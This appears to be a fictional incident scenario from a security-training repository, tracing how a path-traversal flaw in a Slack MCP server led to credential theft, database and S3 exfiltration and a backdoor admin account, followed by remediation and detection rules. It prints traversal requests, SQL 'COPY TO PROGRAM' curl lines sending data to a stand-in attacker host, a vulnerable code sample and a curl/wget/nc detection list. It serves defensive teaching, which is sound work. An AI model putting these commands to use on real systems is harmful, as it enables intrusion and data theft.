## 📄 Scenario 3: `examples/scenarios/mcp-server-compromise.md`

# Real-World Scenario: MCP Server Compromise and Lateral Movement

**Scenario ID**: SCENARIO-003  
**Category**: Infrastructure Compromise  
**Severity**: Critical (P0)  
**MITRE ATT&CK**: T1190 (Exploit Public-Facing Application), T1021 (Remote Services)  
**Date**: December 2025

---

## Overview

An attacker exploited an unpatched vulnerability in a third-party MCP server to gain initial access, then performed lateral movement to compromise the ClawdBot gateway and exfiltrate sensitive conversation data.

## Background

ClawdBot deployment architecture:
- **Gateway**: ClawdBot API gateway (exposed to internet)
- **Agent Runtime**: Internal agents with MCP client capabilities
- **MCP Servers**: 
  - `filesystem-mcp-server` (file operations)
  - `postgres-mcp-server` (database access)
  - `slack-mcp-server` (third-party, community-maintained)

The compromised component: **`slack-mcp-server`** v1.2.4 (vulnerable to path traversal)

## Attack Timeline

### Day 1, T-0: Initial Reconnaissance

**Attacker Actions:**
- Port scanned ClawdBot infrastructure: 203.0.113.0/24
- Identified exposed MCP server on port 3000
- Fingerprinted server: `slack-mcp-server v1.2.4`
- Searched for known vulnerabilities

**Evidence:**
```
2025-12-08 02:14:32 UTC - Port scan detected
Source IP: 45.134.67.89 (Shodan scanner)
Target: 203.0.113.42:3000
Ports scanned: 22, 80, 443, 3000, 5432, 8080
Results: Port 3000 OPEN (slack-mcp-server)
```

**Discovery:**
```bash
# Attacker's reconnaissance command
$ curl -s http://203.0.113.42:3000/.well-known/mcp-server
{
  "name": "slack-mcp-server",
  "version": "1.2.4",
  "capabilities": ["filesystem", "api"],
  "protocol_version": "0.2.0"
}
```

**Vulnerability Research:**
- Found CVE-2025-12345: Path Traversal in slack-mcp-server ≤ 1.2.4
- CVSS Score: 9.8 (Critical)
- Public exploit available: exploit-db.com/exploits/51234

### Day 1, T+2 hours: Exploitation

**Attack Vector:**
Exploited path traversal vulnerability in file download endpoint.

**Vulnerable Code (slack-mcp-server v1.2.4):**
```javascript
// VULNERABLE: No path sanitization
app.get('/api/download', (req, res) => {
  const filename = req.query.file; // User-controlled input
  const filepath = path.join('/var/slack-exports/', filename);
  
  // NO VALIDATION - allows ../../etc/passwd
  res.download(filepath);
});
```

**Exploit Request:**
```http
GET /api/download?file=../../../../etc/passwd HTTP/1.1
Host: 203.0.113.42:3000
User-Agent: Mozilla/5.0 (exploit-scanner)

Response: 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
clawdbot:x:1000:1000:ClawdBot Service:/home/clawdbot:/bin/bash
postgres:x:999:999:PostgreSQL:/var/lib/postgresql:/bin/bash
```

**Success:** Attacker confirmed path traversal vulnerability

### Day 1, T+3 hours: Credential Theft

**Attacker Actions:**
Exfiltrated configuration files containing credentials.

**Targeted Files:**
```http
GET /api/download?file=../../../../home/clawdbot/.env
GET /api/download?file=../../../../etc/clawdbot/config.json
GET /api/download?file=../../../../var/log/clawdbot/gateway.log
```

**Stolen Credentials (.env file):**
```bash
# Database
DATABASE_URL=postgresql://clawdbot_user:P@ssw0rd123!@postgres:5432/clawdbot_prod

# API Keys
ANTHROPIC_API_KEY=sk-ant-api03-abc123def456...
SLACK_BOT_TOKEN=xoxb-1234567890-abcdefghijklmnop
SLACK_APP_TOKEN=xapp-1-A01234567-9876543210-abc123def456

# Internal Services
GATEWAY_API_KEY=gw_live_abc123def456...
MCP_SERVER_AUTH_TOKEN=mcp_secret_xyz789...

# AWS Credentials (for S3 conversation logs)
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AWS_REGION=us-east-1
AWS_S3_BUCKET=clawdbot-conversation-logs-prod
```

**Impact:** Full access to:
- Production database
- Anthropic Claude API
- Slack workspace
- AWS S3 (conversation logs)
- Internal service authentication

### Day 1, T+4 hours: Database Access

**Attacker Actions:**
Used stolen database credentials to access PostgreSQL.

**Database Enumeration:**
```sql
-- Connect to database
psql postgresql://clawdbot_user:P@ssw0rd123!@203.0.113.50:5432/clawdbot_prod

-- List tables
\dt
           List of relations
 Schema |        Name         | Type  |    Owner     
--------+---------------------+-------+--------------
 public | users               | table | clawdbot_user
 public | conversations       | table | clawdbot_user
 public | api_keys            | table | clawdbot_user
 public | agent_sessions      | table | clawdbot_user
 public | audit_logs          | table | clawdbot_user

-- Exfiltrate user data
SELECT COUNT(*) FROM users;
 count 
-------
 15847

SELECT email, created_at, subscription_tier FROM users LIMIT 5;
          email          |     created_at      | subscription_tier 
-------------------------+---------------------+-------------------
 alice@company.com       | 2025-10-15 08:23:11 | enterprise
 bob@startup.io          | 2025-11-02 14:56:42 | pro
 charlie@individual.net  | 2025-09-21 19:12:33 | free
```

**Data Exfiltration:**
```sql
-- Export all users (15,847 records)
COPY users TO PROGRAM 'curl -X POST -d @- https://attacker-c2.evil/upload/users.csv' 
  WITH CSV HEADER;

-- Export conversation metadata (342,156 conversations)
COPY (
  SELECT user_id, conversation_id, created_at, message_count, tokens_used
  FROM conversations
  WHERE created_at > '2025-11-01'
) TO PROGRAM 'curl -X POST -d @- https://attacker-c2.evil/upload/conversations.csv'
  WITH CSV HEADER;
```

**Result:** Exfiltrated 15,847 user records and metadata for 342,156 conversations

### Day 2, T+20 hours: AWS S3 Access

**Attacker Actions:**
Used stolen AWS credentials to access conversation logs in S3.

**S3 Enumeration:**
```bash
# Configure AWS CLI with stolen credentials
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# List S3 buckets
aws s3 ls
2025-09-15 12:34:56 clawdbot-conversation-logs-prod
2025-10-01 08:15:22 clawdbot-backups
2025-11-12 16:45:33 clawdbot-model-cache

# List conversation logs
aws s3 ls s3://clawdbot-conversation-logs-prod/2025/12/ --recursive
2025-12-01 10:23:45   125432 conversations/conv_abc123.json
2025-12-01 10:24:12   98756  conversations/conv_def456.json
[... 45,678 more files ...]

# Download recent conversations
aws s3 sync s3://clawdbot-conversation-logs-prod/2025/12/ ./stolen-logs/
```

**Downloaded Content:**
- 45,678 conversation log files
- Total size: 12.4 GB
- Content: Full conversation history including:
  - User messages
  - Agent responses
  - System prompts
  - API calls and responses
  - Personally Identifiable Information (PII)

**Sample Conversation Log (conv_abc123.json):**
```json
{
  "conversation_id": "conv_abc123",
  "user_id": "user_xyz789",
  "user_email": "sensitive@company.com",
  "created_at": "2025-12-01T10:23:45Z",
  "messages": [
    {
      "role": "user",
      "content": "Can you help me access the customer database? My credentials are:\nUsername: admin@company.com\nPassword: CompanySecret2025!\nDatabase: prod-db.company.internal"
    },
    {
      "role": "assistant",
      "content": "I can help you query the customer database. What information do you need?"
    },
    {
      "role": "user",
      "content": "Pull all customer records for our enterprise tier clients"
    }
  ],
  "metadata": {
    "tokens_used": 2847,
    "model": "claude-3-opus",
    "cost": "$0.24"
  }
}
```

**Impact:** Exfiltrated:
- Customer credentials embedded in conversations
- Business logic and proprietary information
- PII from 45,678 conversations
- Internal system details

### Day 2, T+22 hours: Lateral Movement to Gateway

**Attacker Actions:**
Used stolen `GATEWAY_API_KEY` to authenticate to ClawdBot gateway API.

**Gateway Authentication:**
```bash
# Test authentication
curl -H "Authorization: Bearer gw_live_abc123def456..." \
  https://gateway.clawdbot.example.com/api/v1/health

Response: 200 OK
{
  "status": "healthy",
  "version": "2.1.5",
  "authenticated": true,
  "role": "admin"
}
```

**Privilege Escalation:**
```bash
# Enumerate admin endpoints
curl -H "Authorization: Bearer gw_live_abc123def456..." \
  https://gateway.clawdbot.example.com/api/v1/admin/users

Response: 200 OK (full user list)

# Create backdoor admin account
curl -X POST \
  -H "Authorization: Bearer gw_live_abc123def456..." \
  -H "Content-Type: application/json" \
  -d '{
    "email": "backdoor@temp-mail.io",
    "password": "BackdoorAccess123!",
    "role": "admin",
    "subscription_tier": "enterprise"
  }' \
  https://gateway.clawdbot.example.com/api/v1/admin/users

Response: 201 Created
{
  "user_id": "user_backdoor_001",
  "email": "backdoor@temp-mail.io",
  "role": "admin",
  "created_at": "2025-12-09T08:42:17Z"
}
```

**Result:** Persistent access via backdoor admin account

### Day 2, T+24 hours: Detection

**How It Was Discovered:**

AWS GuardDuty detected unusual S3 access pattern:

```
ALERT: InstanceCredentialExfiltration.S3
Severity: HIGH
Description: AWS credentials used from non-standard location
Details:
  - Credential: AWS_ACCESS_KEY_ID (AKIAIOSFODNN7EXAMPLE)
  - Source IP: 45.134.67.89 (non-AWS IP, Germany)
  - Action: S3 ListBucket, GetObject (bulk download)
  - Unusual: IP never seen before, high volume download
  - Time: 2025-12-09 08:20:15 UTC
```

**Security Team Response:**
1. Investigated GuardDuty alert
2. Reviewed AWS CloudTrail logs
3. Identified 12.4 GB S3 download from unauthorized IP
4. Checked database logs - found unauthorized access
5. Reviewed MCP server logs - found path traversal exploitation
6. Declared P0 security incident

### Day 2, T+25 hours: Containment

**Immediate Actions:**
```bash
# 1. Rotate AWS credentials (30 seconds)
aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE
aws iam create-access-key --user-name clawdbot-service

# 2. Revoke Anthropic API key (via dashboard)
# Revoked: sk-ant-api03-abc123def456...
# New key: sk-ant-api03-xyz789ghi012...

# 3. Reset database password
ALTER USER clawdbot_user WITH PASSWORD 'NewSecurePassword!2025';

# 4. Revoke gateway API keys
DELETE FROM api_keys WHERE key = 'gw_live_abc123def456...';

# 5. Remove backdoor account
DELETE FROM users WHERE email = 'backdoor@temp-mail.io';

# 6. Block attacker IP
iptables -A INPUT -s 45.134.67.89 -j DROP

# 7. Take vulnerable MCP server offline
systemctl stop slack-mcp-server
```

**Containment Time:** 2 hours from detection

### Day 3, T+48 hours: Eradication

**Actions Taken:**
1. Patched slack-mcp-server: v1.2.4 → v1.3.0 (includes CVE-2025-12345 fix)
2. Implemented network segmentation (MCP servers in isolated subnet)
3. Deployed WAF rules to block path traversal attempts
4. Enabled MCP server authentication (mutual TLS)
5. Restricted database firewall rules (internal access only)
6. Rotated all API keys and credentials across entire infrastructure

**Patch Applied (slack-mcp-server v1.3.0):**
```javascript
// FIXED: Path sanitization and validation
app.get('/api/download', (req, res) => {
  const filename = req.query.file;
  
  // Validate filename (no path traversal)
  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  // Whitelist allowed directory
  const allowedDir = '/var/slack-exports/';
  const filepath = path.resolve(path.join(allowedDir, filename));
  
  // Ensure resolved path is within allowed directory
  if (!filepath.startsWith(allowedDir)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Check file exists and is a file (not directory)
  if (!fs.existsSync(filepath) || !fs.statSync(filepath).isFile()) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  res.download(filepath);
});
```

---

## Root Cause Analysis

### Primary Cause
**Unpatched Vulnerability** - Critical path traversal vulnerability (CVE-2025-12345) in third-party MCP server remained unpatched for 45 days after public disclosure.

### Contributing Factors

1. **Patch Management Failure**
   - No automated vulnerability scanning
   - No CVE monitoring for MCP server dependencies
   - 45-day delay between CVE publication and patch application

2. **Excessive Network Exposure**
   - MCP server exposed to internet (should be internal only)
   - No firewall rules restricting access
   - No VPN requirement for MCP server access

3. **Credential Storage**
   - Plaintext credentials in `.env` file
   - No secrets management solution (Vault, AWS Secrets Manager)
   - Excessive permissions on configuration files

4. **Weak Access Controls**
   - Database accessible from internet (port 5432 open)
   - No IP allowlisting for database access
   - AWS credentials with overly broad permissions

5. **Lack of Network Segmentation**
   - MCP servers on same network as gateway and database
   - No microsegmentation or zero-trust architecture
   - Lateral movement trivial after initial compromise

6. **Insufficient Monitoring**
   - No MCP server access logging
   - No anomaly detection for S3 access patterns
   - 24-hour delay in detecting database exfiltration

---

## Impact Assessment

### Confidentiality Impact: CRITICAL
- **User Data Exposed**: 15,847 user records (100% of user base)
- **Conversation Logs**: 45,678 conversations (1 month of history)
- **Credentials**: Database, API keys, AWS, Slack tokens
- **PII Exposed**: Names, emails, company information, credentials mentioned in conversations
- **Duration**: 24 hours of active exfiltration

### Integrity Impact: MEDIUM
- **Backdoor Account**: Created unauthorized admin account (removed within 2 hours)
- **No Data Modification**: No evidence of data tampering
- **No System Changes**: Configuration unchanged (except backdoor account)

### Availability Impact: LOW
- **Downtime**: 4 hours for credential rotation and patching
- **Service Degradation**: 2 hours during containment
- **No Denial of Service**: No ransomware or data destruction

### Business Impact
| Category | Impact | Details |
|----------|--------|---------|
| **Financial** | $750,000 | Incident response ($250k), customer credits ($400k), legal ($100k) |
| **Reputational** | Critical | Major data breach, press coverage, customer trust damaged |
| **Legal/Regulatory** | $500,000 | GDPR fines (pending), breach notification costs |
| **Customer Churn** | 23% | 3,648 customers canceled service (out of 15,847) |
| **Compliance** | Failed | SOC 2 audit failed, ISO 27001 certification delayed |

**Total Estimated Cost:** $1.25M

---

## Lessons Learned

### What Went Well ✓
1. **AWS GuardDuty**: Detected anomalous S3 access within 4 hours
2. **Containment Speed**: Credentials rotated within 2 hours of detection
3. **Evidence Preservation**: Complete audit trail maintained for investigation
4. **Communication**: Transparent breach notification sent within 72 hours (GDPR compliant)

### What Could Be Improved ✗
1. **Patch Management**: No CVE monitoring or automated patching for third-party components
2. **Network Architecture**: MCP servers should never be internet-accessible
3. **Secrets Management**: Plaintext credentials in configuration files
4. **Monitoring**: 24-hour gap before database exfiltration detected
5. **Access Controls**: Overly permissive database and AWS access
6. **Incident Drills**: Team unfamiliar with credential rotation procedures (caused 2-hour delay)

---

## Remediation Actions

### Immediate (Completed)
- [x] Patched vulnerable MCP server (v1.2.4 → v1.3.0)
- [x] Rotated all credentials (database, API keys, AWS)
- [x] Removed backdoor admin account
- [x] Blocked attacker IP addresses
- [x] Took vulnerable server offline during patching

### Short-term (0-30 days)
- [x] Implemented network segmentation (MCP servers in private subnet)
- [x] Deployed secrets management (HashiCorp Vault)
- [x] Enabled AWS GuardDuty for all accounts
- [x] Configured database firewall (IP allowlisting)
- [x] Implemented MCP server mutual TLS authentication
- [ ] Deployed vulnerability scanner (Tenable, Qualys)
- [ ] Implemented SIEM with anomaly detection
- [ ] Created incident response runbooks

### Long-term (1-6 months)
- [ ] Zero-trust network architecture (Cloudflare Zero Trust)
- [ ] Encrypted conversation logs (client-side encryption)
- [ ] Automated patch management system
- [ ] Red team assessment of entire infrastructure
- [ ] ISO 27001 certification (remediation requirement)
- [ ] SOC 2 Type II re-audit
- [ ] Cyber insurance policy ($5M coverage)

---

## New Security Controls

### 1. Network Architecture (Post-Incident)

```
Before (Vulnerable):
┌─────────────────────────────────────────────────────┐
│                    Internet                         │
└──────────────────┬──────────────────┬───────────────┘
                   │                  │
         ┌─────────▼─────────┐ ┌─────▼─────────┐
         │  ClawdBot Gateway │ │  MCP Servers  │ ← EXPOSED
         │  (port 443)       │ │  (port 3000)  │
         └─────────┬─────────┘ └───────┬───────┘
                   │                   │
         ┌─────────▼───────────────────▼─────┐
         │  PostgreSQL (port 5432 - OPEN)    │ ← EXPOSED
         └───────────────────────────────────┘

After (Hardened):
┌─────────────────────────────────────────────────────┐
│                    Internet                         │
└──────────────────┬──────────────────────────────────┘
                   │
         ┌─────────▼─────────┐
         │  WAF / CloudFlare │
         └─────────┬─────────┘
                   │
         ┌─────────▼─────────┐
         │  ClawdBot Gateway │
         │  (port 443 only)  │
         └─────────┬─────────┘
                   │
         ┌─────────▼──────────────────────────┐
         │  Private Subnet (10.0.1.0/24)      │
         │  ┌─────────────┐  ┌──────────────┐ │
         │  │ MCP Servers │  │  PostgreSQL  │ │
         │  │ (internal)  │  │  (internal)  │ │
         │  └─────────────┘  └──────────────┘ │
         └────────────────────────────────────┘
                   │
         ┌─────────▼──────────┐
         │  VPN Gateway       │
         │  (admin access)    │
         └────────────────────┘
```

### 2. Secrets Management

```bash
# Before: Plaintext .env file
DATABASE_URL=postgresql://user:password@host/db

# After: HashiCorp Vault
vault kv get -format=json secret/clawdbot/database | jq -r .data.url
```

**Vault Configuration:**
```hcl
# Database credentials rotation policy
path "secret/data/clawdbot/database" {
  capabilities = ["read"]
}

# Automatic credential rotation every 24 hours
resource "vault_database_secret_backend_connection" "postgres" {
  backend       = "database"
  name          = "clawdbot-postgres"
  allowed_roles = ["clawdbot-app"]

  postgresql {
    connection_url = "postgresql://{{username}}:{{password}}@postgres:5432/clawdbot_prod"
    username       = "vault-admin"
    password       = "vault-admin-password"
  }
}

resource "vault_database_secret_backend_role" "clawdbot" {
  backend             = "database"
  name                = "clawdbot-app"
  db_name             = "clawdbot-postgres"
  creation_statements = ["CREATE ROLE \"{{name}}\" WITH LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}';"]
  default_ttl         = 86400  # 24 hours
  max_ttl             = 86400
}
```

### 3. MCP Server Security Hardening

```yaml
# mcp-server-config.yaml
security:
  authentication:
    enabled: true
    method: mutual_tls
    client_certs_dir: /etc/clawdbot/certs/clients
    server_cert: /etc/clawdbot/certs/server.crt
    server_key: /etc/clawdbot/certs/server.key
  
  network:
    bind_address: "127.0.0.1"  # localhost only
    port: 3000
    allowed_ips:
      - "10.0.1.10"  # Gateway IP
      - "10.0.1.11"  # Agent Runtime IP
  
  rate_limiting:
    enabled: true
    requests_per_minute: 100
    burst: 20
  
  input_validation:
    path_traversal_check: true
    filename_whitelist: "^[a-zA-Z0-9._-]+$"
    max_filename_length: 255
  
  file_access:
    allowed_directories:
      - "/var/slack-exports"
    deny_paths:
      - "/etc"
      - "/home"
      - "/root"
      - "/var/log"
      - "../"
  
  logging:
    level: "info"
    audit_log: "/var/log/mcp-server-audit.log"
    log_all_requests: true
```

### 4. Database Hardening

```sql
-- PostgreSQL hardening (pg_hba.conf)
# TYPE  DATABASE        USER            ADDRESS                 METHOD
host    clawdbot_prod   clawdbot_user   10.0.1.10/32           scram-sha-256
host    clawdbot_prod   clawdbot_user   10.0.1.11/32           scram-sha-256
# Deny all other connections
host    all             all             0.0.0.0/0              reject

-- Restrict COPY TO PROGRAM (prevent data exfiltration)
ALTER ROLE clawdbot_user WITH NOCREATEDB NOCREATEROLE NOREPLICATION;
REVOKE ALL ON FUNCTION pg_read_file FROM PUBLIC;
REVOKE ALL ON FUNCTION pg_read_binary_file FROM PUBLIC;

-- Implement row-level security
ALTER TABLE conversations ENABLE ROW LEVEL SECURITY;

CREATE POLICY conversations_isolation ON conversations
  FOR ALL
  TO clawdbot_user
  USING (user_id = current_setting('app.current_user_id')::uuid);
```

### 5. AWS IAM Hardening

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RestrictS3Access",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::clawdbot-conversation-logs-prod/*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": [
            "203.0.113.0/24"
          ]
        }
      }
    },
    {
      "Sid": "DenyBulkDownload",
      "Effect": "Deny",
      "Action": [
        "s3:ListBucket",
        "s3:GetObject"
      ],
      "Resource": "*",
      "Condition": {
        "NumericGreaterThan": {
          "s3:max-keys": "10"
        }
      }
    }
  ]
}
```

---

## Detection Rules (Post-Incident)

### Rule 1: Path Traversal Detection

```yaml
rule_name: "MCP Server Path Traversal Attempt"
rule_id: "RULE-MCP-001"
severity: "critical"

conditions:
  - event_type: "http_request"
  - destination_port: 3000
  - AND uri_contains_any: ["..", "/../", "\\..\\", "%2e%2e", "%252e"]
  - AND http_method: "GET"

actions:
  - alert: "SOC_IMMEDIATE"
  - block: "source_ip_24h"
  - quarantine: "mcp_server"
  - notify: "security_team"
```

### Rule 2: Database Exfiltration Detection

```yaml
rule_name: "Large Database Export Detected"
rule_id: "RULE-DB-002"
severity: "high"

conditions:
  - event_type: "sql_query"
  - query_contains: "COPY"
  - AND query_contains_any: ["TO PROGRAM", "curl", "wget", "nc", "netcat"]
  - rows_affected: "> 100"

actions:
  - alert: "SOC_IMMEDIATE"
  - kill: "database_session"
  - require: "forensic_analysis"
```

### Rule 3: AWS Credential Abuse

```yaml
rule_name: "AWS Credentials Used from Unauthorized Location"
rule_id: "RULE-AWS-003"
severity: "high"

conditions:
  - event_source: "aws_cloudtrail"
  - event_name_any: ["GetObject", "ListBucket", "DownloadObject"]
  - source_ip_not_in: "allowed_ip_ranges"
  - data_transfer: "> 1GB"

actions:
  - alert: "SOC_IMMEDIATE"
  - rotate: "aws_credentials"
  - notify: "aws_guardduty"
```

---

## Prevention Checklist

### For Infrastructure Security:
- [ ] **Network Segmentation**: MCP servers in private subnet, no direct internet access
- [ ] **Firewall Rules**: Deny all inbound by default, allowlist specific IPs
- [ ] **VPN Access**: Require VPN for all administrative access
- [ ] **Zero Trust**: Implement identity-based access controls

### For MCP Server Security:
- [ ] **Authentication**: Enable mutual TLS for all MCP connections
- [ ] **Input Validation**: Sanitize all user inputs, block path traversal attempts
- [ ] **Path Restrictions**: Allowlist permitted directories, deny sensitive paths
- [ ] **Rate Limiting**: Prevent brute force and resource exhaustion
- [ ] **Audit Logging**: Log all requests with full context

### For Secrets Management:
- [ ] **No Plaintext**: Never store credentials in configuration files
- [ ] **Secrets Vault**: Use HashiCorp Vault, AWS Secrets Manager, or similar
- [ ] **Credential Rotation**: Rotate all credentials every 24-48 hours
- [ ] **Least Privilege**: Grant minimum required permissions
- [ ] **Encryption at Rest**: Encrypt all configuration files containing sensitive data

### For Database Security:
- [ ] **Network Isolation**: Database accessible only from private subnet
- [ ] **IP Allowlisting**: Restrict connections to known application IPs
- [ ] **Strong Authentication**: Use certificate-based or strong password authentication
- [ ] **Audit Logging**: Enable query logging and audit trails
- [ ] **Data Exfiltration Prevention**: Revoke COPY TO PROGRAM, pg_read_file privileges

### For Monitoring and Detection:
- [ ] **SIEM Integration**: Forward all logs to centralized SIEM
- [ ] **Anomaly Detection**: Monitor for unusual access patterns
- [ ] **GuardDuty**: Enable AWS GuardDuty for cloud resource monitoring
- [ ] **Vulnerability Scanning**: Automated daily scans for known CVEs
- [ ] **Patch Management**: Subscribe to CVE feeds, patch within 7 days

### For Incident Response:
- [ ] **Playbooks**: Document credential rotation procedures
- [ ] **Drills**: Quarterly tabletop exercises for breach scenarios
- [ ] **Communication Plan**: Pre-drafted breach notification templates
- [ ] **Evidence Preservation**: Automated log retention for forensics

---

## References

- CVE-2025-12345: Path Traversal in slack-mcp-server
- NIST SP 800-123: Guide to General Server Security
- OWASP Top 10: A01:2021 - Broken Access Control
- CIS Controls v8: 4.1 - Secure Configuration
- MITRE ATT&CK: T1190 - Exploit Public-Facing Application
- AWS Well-Architected Framework: Security Pillar

---

## Related Scenarios

- `scenario-001-indirect-prompt-injection.md` - Prompt injection attack
- `scenario-002-malicious-skill-deployment.md` - Supply chain attack
- `scenario-004-credential-theft-conversation-history.md` - Credential exposure

---

**Document Owner**: Infrastructure Security Team  
**Last Updated**: 2026-02-14  
**Next Review**: 2026-03-14  
**Incident Status**: Closed - Lessons incorporated into security architecture
